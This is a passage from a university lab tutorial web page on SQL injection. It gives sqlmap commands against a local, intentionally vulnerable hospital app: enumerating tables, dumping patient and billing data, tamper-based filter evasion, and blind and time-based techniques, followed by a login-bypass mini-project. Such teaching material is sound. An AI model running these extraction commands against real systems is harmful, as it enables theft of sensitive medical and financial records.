+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php?q=*&quot; -D hospital_emr --tables --batch</span><br></span></code></pre></div></div>
+<p>You should see tables such as patients, billing, appointments, etc.</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="6--list-columns-for-a-table-example-patients">6 — List columns for a table (example: patients)<a href="#6--list-columns-for-a-table-example-patients" class="hash-link" aria-label="Direct link to 6 — List columns for a table (example: patients)" title="Direct link to 6 — List columns for a table (example: patients)" translate="no">​</a></h2>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php?q=*&quot; -D hospital_emr -T patients --columns --batch</span><br></span></code></pre></div></div>
+<p>This reveals column names and types (e.g., id, medical_record_number, first_name, last_name, dob, email).</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="7--dump-table-data-targeted-extraction">7 — Dump table data (targeted extraction)<a href="#7--dump-table-data-targeted-extraction" class="hash-link" aria-label="Direct link to 7 — Dump table data (targeted extraction)" title="Direct link to 7 — Dump table data (targeted extraction)" translate="no">​</a></h2>
+<p>Dump entire table (lab only):</p>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php?q=*&quot; -D hospital_emr -T patients --dump --batch</span><br></span></code></pre></div></div>
+<p>Dump specific columns only (recommended for focused demo):</p>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php?q=*&quot; -D hospital_emr -T patients -C &quot;medical_record_number,first_name,last_name,email&quot; --dump --batch</span><br></span></code></pre></div></div>
+<p>Dump rows with a WHERE clause:</p>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php?q=*&quot; -D hospital_emr -T patients --where=&quot;email LIKE &#x27;%@example.test&#x27;&quot; --dump --batch</span><br></span></code></pre></div></div>
+<p>Dump billing table (exfiltration demo):</p>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php?q=*&quot; -D hospital_emr -T billing --dump --batch</span><br></span></code></pre></div></div>
+<p><strong>Notes:</strong></p>
+<ul>
+<li>--dump extracts and saves data in sqlmap&#x27;s output folder (check path in sqlmap output).</li>
+<li>Use -C to limit columns and reduce noise.</li>
+</ul>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="8--if-the-site-uses-post-form-instead-of-get">8 — If the site uses POST (form) instead of GET<a href="#8--if-the-site-uses-post-form-instead-of-get" class="hash-link" aria-label="Direct link to 8 — If the site uses POST (form) instead of GET" title="Direct link to 8 — If the site uses POST (form) instead of GET" translate="no">​</a></h2>
+<p>Simulate POST body with --data:</p>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php&quot; --data=&quot;q=John&quot; -p q --batch</span><br></span></code></pre></div></div>
+<ul>
+<li>-p q tells sqlmap to focus on parameter q.</li>
+<li>Use --data for POST targets.</li>
+</ul>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="9--advanced-options--practical-tips">9 — Advanced options &amp; practical tips<a href="#9--advanced-options--practical-tips" class="hash-link" aria-label="Direct link to 9 — Advanced options &amp; practical tips" title="Direct link to 9 — Advanced options &amp; practical tips" translate="no">​</a></h2>
+<ul>
+<li>Increase depth for more aggressive tests:</li>
+</ul>
+<div class="language-bahs codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bahs codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php?q=*&quot; --level=5 --risk=3 --batch</span><br></span></code></pre></div></div>
+<ul>
+<li>Use tamper scripts if basic payloads are filtered (only in lab):</li>
+</ul>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php?q=*&quot; --tamper=between,randomcase --batch</span><br></span></code></pre></div></div>
+<ul>
+<li>Set custom headers / cookies if the app requires authentication:</li>
+</ul>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php?q=*&quot; --headers=&quot;User-Agent: sqlmap&quot; --cookie=&quot;SESSION=abcd&quot; --batch</span><br></span></code></pre></div></div>
+<ul>
+<li>Threads for speed:</li>
+</ul>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php?q=*&quot; --threads=5 --batch</span><br></span></code></pre></div></div>
+<ul>
+<li>Specify output directory:</li>
+</ul>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php?q=*&quot; --output-dir=./sqlmap-output --batch</span><br></span></code></pre></div></div>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="10--interpreting-sqlmap-output">10 — Interpreting sqlmap output<a href="#10--interpreting-sqlmap-output" class="hash-link" aria-label="Direct link to 10 — Interpreting sqlmap output" title="Direct link to 10 — Interpreting sqlmap output" translate="no">​</a></h2>
+<ul>
+<li>Injection confirmation: sqlmap prints which parameter and which technique succeeded (e.g., Parameter: q (GET) — Type: UNION query).</li>
+<li>Database listing / tables / columns: outputs are printed and saved under sqlmap output directory.</li>
+<li>Dump results: data is shown in terminal and saved to files (CSV/TXT) — use these files for lab reports.</li>
+<li>Logs: check sqlmap verbose output for payloads used — useful to teach how exploitation maps to manual payloads.</li>
+</ul>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="11--when-union-fails-use-blind-or-time-based-options">11 — When UNION fails: use blind or time-based options<a href="#11--when-union-fails-use-blind-or-time-based-options" class="hash-link" aria-label="Direct link to 11 — When UNION fails: use blind or time-based options" title="Direct link to 11 — When UNION fails: use blind or time-based options" translate="no">​</a></h2>
+<p>Boolean-based (slower, less noisy):</p>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php?q=*&quot; --technique=B --batch</span><br></span></code></pre></div></div>
+<p>Time-based:</p>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php?q=*&quot; --technique=T --sleep=3 --batch</span><br></span></code></pre></div></div>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="12--safety-etiquette--cleanup">12 — Safety, etiquette &amp; cleanup<a href="#12--safety-etiquette--cleanup" class="hash-link" aria-label="Direct link to 12 — Safety, etiquette &amp; cleanup" title="Direct link to 12 — Safety, etiquette &amp; cleanup" translate="no">​</a></h2>
+<ul>
+<li>Safety: Never run sqlmap against production services or external targets without written permission. This lab must be isolated (use local VM or container).</li>
+<li>Rate &amp; resource caution: Aggressive scans can disrupt your DB server. Use --level/--risk conservatively and avoid --threads that overwhelm the server.</li>
+<li>Network &amp; logs: sqlmap may generate many requests — review web server logs and DB logs after testing to demonstrate forensic traces.</li>
+<li>Cleanup: After the lab, remove extracted files from the host if they contain sensitive sample data:</li>
+</ul>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rm -rf ~/.local/share/sqlmap/output/*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># or the output dir you specified</span><br></span></code></pre></div></div>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="13--verifying-fix-post-remediation">13 — Verifying fix (post-remediation)<a href="#13--verifying-fix-post-remediation" class="hash-link" aria-label="Direct link to 13 — Verifying fix (post-remediation)" title="Direct link to 13 — Verifying fix (post-remediation)" translate="no">​</a></h2>
+<p>After you deploy patient_lookup_fixed.php (prepared statements), validate that sqlmap can no longer exploit the parameter:</p>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup_fixed.php?q=*&quot; --batch --level=2 --risk=1</span><br></span></code></pre></div></div>
+<p><strong>Expected:</strong> sqlmap should not confirm injection; attempts to dump should fail or produce no results.</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="mini-project--login-page-vulnerable--fixed-final-instructions">Mini Project — Login Page: Vulnerable &amp; Fixed (Final Instructions)<a href="#mini-project--login-page-vulnerable--fixed-final-instructions" class="hash-link" aria-label="Direct link to Mini Project — Login Page: Vulnerable &amp; Fixed (Final Instructions)" title="Direct link to Mini Project — Login Page: Vulnerable &amp; Fixed (Final Instructions)" translate="no">​</a></h2>
+<p><strong>Objective (short):</strong><br>
+<!-- -->Implement two login page for the <code>Hospital</code> lab — one <strong>vulnerable</strong> to SQL Injection and one <strong>fixed</strong>.
+Attack the vulnerable version (manually and with tools) to <strong>bypass the login</strong> and to <strong>retrieve sensitive information</strong> from the web application.
+Produce a single PDF that contains everything and submit it.</p>
+<hr>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-students-must-do-concise">What students must do (concise)<a href="#what-students-must-do-concise" class="hash-link" aria-label="Direct link to What students must do (concise)" title="Direct link to What students must do (concise)" translate="no">​</a></h3>
+<ol>
+<li>
+<p>Build / deploy both pages in the lab environment:</p>
+<ul>
+<li><code>login_vuln.php</code> — intentionally vulnerable version.</li>
+<li><code>login_fixed.php</code> — secure version using prepared statements and safe error handling.</li>
+</ul>
+</li>
+<li>
+<p>Using <strong>manual techniques</strong> and <strong>sqlmap</strong> (or similar), attempt to:</p>
+<ul>
+<li><strong>Bypass the login</strong> (e.g., authenticate as another user).</li>
+<li><strong>Retrieve sensitive data</strong> accessible through the application (examples: user list, patient identifiers, billing rows, etc.).</li>
+<li>Explore other information exposed by the site (pages, endpoints, or debug output).</li>
+</ul>
+</li>
+<li>
+<p>Collect <strong>all evidence</strong> of your work (payloads, command lines, outputs, screenshots, notes).</p>
+</li>
+</ol>
+<hr>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="submission-single-pdf-only">Submission (single PDF only)<a href="#submission-single-pdf-only" class="hash-link" aria-label="Direct link to Submission (single PDF only)" title="Direct link to Submission (single PDF only)" translate="no">​</a></h3>
+<p>Create <strong>one</strong> PDF file and submit it via the Google Form link below (demo — replace later):<br>
+<strong><a href="https://docs.google.com/forms/d/e/1FAIpQLSfy5WQdFYPU28b84C4wR7wW4SyCi_1S6q9KRgrHi1Sj3vLQwA/viewform?usp=header" target="_blank" rel="noopener noreferrer">https://docs.google.com/forms/d/e/1FAIpQLSfy5WQdFYPU28b84C4wR7wW4SyCi_1S6q9KRgrHi1Sj3vLQwA/viewform?usp=header</a></strong></p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/mehdiaitsaid/owasp-top-10-labs/blob/master/labs/injection/sql-injection.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/owasp-top-10-labs/labs/cryptographic-failures"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Cryptographic Failures</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/owasp-top-10-labs/labs/injection/xss"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">XSS</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#what-is-sql-injection" class="table-of-contents__link toc-highlight">What is SQL Injection?</a></li><li><a href="#common-sqli-types" class="table-of-contents__link toc-highlight">Common SQLi Types</a></li><li><a href="#typical-consequences" class="table-of-contents__link toc-highlight">Typical Consequences</a></li><li><a href="#realistic-use-cases-relevant-to-this-lab" class="table-of-contents__link toc-highlight">Realistic Use Cases (relevant to this lab)</a></li><li><a href="#lab-scope--structure" class="table-of-contents__link toc-highlight">Lab scope &amp; structure</a></li><li><a href="#detection--mitigation-high-level" class="table-of-contents__link toc-highlight">Detection &amp; Mitigation (high-level)</a></li><li><a href="#1-vulnerable-php-page-file-patient_lookupphp" class="table-of-contents__link toc-highlight">1) Vulnerable PHP page (file: <code>patient_lookup.php</code>)</a></li><li><a href="#2-why-this-is-vulnerable-brief" class="table-of-contents__link toc-highlight">2) Why this is vulnerable (brief)</a></li><li><a href="#3-step-by-step-exploitation" class="table-of-contents__link toc-highlight">3) Step-by-step exploitation</a><ul><li><a href="#step-0--pre-check" class="table-of-contents__link toc-highlight">Step 0 — Pre-check</a></li><li><a href="#step-1--basic-tautology-discover-behavior--get-many-rows" class="table-of-contents__link toc-highlight">Step 1 — Basic tautology (discover behavior / get many rows)</a></li><li><a href="#step-2--examine-server-side-sql-mapping" class="table-of-contents__link toc-highlight">Step 2 — Examine server-side SQL (mapping)</a></li><li><a href="#step-3--union-based-data-extraction-in-band-sqli" class="table-of-contents__link toc-highlight">Step 3 — Union-based data extraction (in-band SQLi)</a></li><li><a href="#step-4--blind-techniques-when-errors-suppressed" class="table-of-contents__link toc-highlight">Step 4 — Blind techniques (when errors suppressed)</a></li><li><a href="#step-5--oob-out-of-band-exfiltration-advanced--optional" class="table-of-contents__link toc-highlight">Step 5 — OOB (Out-of-band) exfiltration (advanced / optional)</a></li></ul></li><li><a href="#common-pitfalls--hints-for-students" class="table-of-contents__link toc-highlight">Common pitfalls &amp; hints for students</a></li><li><a href="#core-security-changes-high-level" class="table-of-contents__link toc-highlight">Core security changes (high level)</a></li><li><a href="#what-to-test-after-deploying-the-fixed-code" class="table-of-contents__link toc-highlight">What to test after deploying the fixed code</a></li><li><a href="#lab-assumptions--target" class="table-of-contents__link toc-highlight">Lab assumptions &amp; target</a></li><li><a href="#1--install-sqlmap" class="table-of-contents__link toc-highlight">1 — Install sqlmap</a><ul><li><a href="#option-a--via-pip-portable" class="table-of-contents__link toc-highlight">Option A — via <code>pip</code> (portable)</a></li><li><a href="#option-b--clone-latest-from-github-recommended-for-newest-features" class="table-of-contents__link toc-highlight">Option B — clone latest from GitHub (recommended for newest features)</a></li></ul></li><li><a href="#2--safe-discovery-non-destructive" class="table-of-contents__link toc-highlight">2 — Safe discovery (non-destructive)</a></li><li><a href="#3--force-probing-the-q-parameter" class="table-of-contents__link toc-highlight">3 — Force probing the q parameter</a></li><li><a href="#4--enumerate-databases--users" class="table-of-contents__link toc-highlight">4 — Enumerate databases / users</a></li><li><a href="#5--list-tables-in-hospital_emr" class="table-of-contents__link toc-highlight">5 — List tables in hospital_emr</a></li><li><a href="#6--list-columns-for-a-table-example-patients" class="table-of-contents__link toc-highlight">6 — List columns for a table (example: patients)</a></li><li><a href="#7--dump-table-data-targeted-extraction" class="table-of-contents__link toc-highlight">7 — Dump table data (targeted extraction)</a></li><li><a href="#8--if-the-site-uses-post-form-instead-of-get" class="table-of-contents__link toc-highlight">8 — If the site uses POST (form) instead of GET</a></li><li><a href="#9--advanced-options--practical-tips" class="table-of-contents__link toc-highlight">9 — Advanced options &amp; practical tips</a></li><li><a href="#10--interpreting-sqlmap-output" class="table-of-contents__link toc-highlight">10 — Interpreting sqlmap output</a></li><li><a href="#11--when-union-fails-use-blind-or-time-based-options" class="table-of-contents__link toc-highlight">11 — When UNION fails: use blind or time-based options</a></li><li><a href="#12--safety-etiquette--cleanup" class="table-of-contents__link toc-highlight">12 — Safety, etiquette &amp; cleanup</a></li><li><a href="#13--verifying-fix-post-remediation" class="table-of-contents__link toc-highlight">13 — Verifying fix (post-remediation)</a></li><li><a href="#mini-project--login-page-vulnerable--fixed-final-instructions" class="table-of-contents__link toc-highlight">Mini Project — Login Page: Vulnerable &amp; Fixed (Final Instructions)</a><ul><li><a href="#what-students-must-do-concise" class="table-of-contents__link toc-highlight">What students must do (concise)</a></li><li><a href="#submission-single-pdf-only" class="table-of-contents__link toc-highlight">Submission (single PDF only)</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Labs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/owasp-top-10-labs/labs/intro">Hands-On Labs</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Contact me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://www.linkedin.com/in/mehdi-aitsaid/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Linkedin<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://www.instagram.com/mehdi.aitsaid/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Instagram<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://github.com/mehdiaitsaid" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://www.ump.ma/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Université Mohammed I</a></li><li class="footer__item"><a href="https://estn.ump.ma/" target="_blank" rel="noopener noreferrer" class="footer__link-item">EST Nador<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 Pr. AIT SAID Mehdi.</div></div></div></footer></div>
+</body>
+</html>
